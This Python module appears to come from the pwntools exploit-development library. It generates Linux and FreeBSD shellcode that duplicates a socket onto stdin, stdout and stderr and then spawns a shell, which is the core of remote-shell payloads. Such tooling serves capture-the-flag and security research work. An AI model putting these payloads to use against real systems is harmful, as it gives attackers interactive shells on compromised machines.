from pwn.internal.shellcode_helper import *
from sh import sh

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
def dupsh(sock = 'ebp', os = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr and spawns a shell."""
    if os in ['freebsd', 'linux']:
        return dup(sock), sh()
    else:
        bug('OS was neither linux nor freebsd')

@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
def dup(sock = 'ebp', os = None, arch = None):
    """Args: [sock (imm/reg) = ebp]
    Duplicates sock to stdin, stdout and stderr."""

    if arch == 'i386':
        if os == 'freebsd':
            return _dup_freebsd_i386(sock)
        elif os == 'linux':
            return _dup_linux_i386(sock)
    elif arch == 'amd64':
        if os in ['linux', 'freebsd']:
            return _dup_amd64(sock)

    bug('OS/arch combination (%s,%s) is not supported for dup' % (os, arch))

def _dup_linux_i386(sock):
    return """
dup:
        setfd ebx, %s
        push byte 3
        pop ecx
.loop:
        dec ecx
        push byte SYS_dup2
        pop eax
        int 0x80
        jnz .loop
""" % str(sock)

def _dup_freebsd_i386(sock):
    return """
dup:
        setfd esi, %s
        push byte 2
        pop ebp
        push SYS_dup2
        pop eax
.loop:
        pushad
        int 0x80
        popad
        dec ebp
        jns .loop
.after:
""" % str(sock)

def _dup_amd64(sock):
    sock = arg_fixup(sock)

    if sock in ['ebp', 'rbp']:
        setup = ''
    elif sock == 0:
        setup = 'xor ebp, ebp'
    elif isinstance(sock, int):
        setup = 'push %d\n        pop rbp' % sock
    else:
        setup = 'mov ebp, %s' % str(sock)

    return """
dup:
        %s
        push byte 3
.loop:
        mov edi, ebp
        pop rsi
        dec esi
        js .after
        push rsi
        push SYS64_dup2
        pop rax
        syscall
        jmp .loop
.after:""" % setup
